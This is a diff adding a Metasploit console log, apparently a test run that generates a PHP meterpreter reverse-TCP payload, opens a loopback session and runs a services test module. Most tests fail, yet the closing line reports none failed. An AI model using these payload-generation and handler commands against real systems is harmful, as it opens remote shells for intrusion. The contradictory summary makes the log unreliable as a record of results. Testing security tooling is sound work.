@@ -1,0 +1,66 @@
+use php/meterpreter_reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> generate -o /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-14yr1ko.php -f raw lport=6032 lhost=127.0.0.1
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> [4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-486jp3.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-1qpk8f6.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-1akb12a.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-1ovmea5.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-14yr1ko.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Payload Handler Started as Job 27
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6032 
+[*] Meterpreter session 28 opened (127.0.0.1:6032 -> 127.0.0.1:38340 ) at 2022-01-19 11:05:44 +0000
+use test/services
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> run session=28 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[!]  * unloadable Meterpreter extension: extapi
+[*] Running against session 28
+[*] Session type is meterpreter and platform is linux
+[+] should raise a runtime exception if no access to service
+[-] FAILED: should create a service  testes
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should return info on the newly-created service testes
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (php/linux)
+[-] FAILED: should delete the new service testes
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[+] should raise a runtime exception if services doesnt exist
+[-] FAILED: should start W32Time
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should stop W32Time
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should return status on a given service winmgmt
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should modify config on a given service aVrBeg
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should list services
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (php/linux)
+[-] FAILED: should start a disabled service aTQCHS
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should return info on a given service  winmgmt
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (php/linux)
+[-] FAILED: should restart a started service W32Time
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[*] Testing complete in 0.010181407
+[*] Passed: 13; Failed: 0
+[*] Post module execution completed
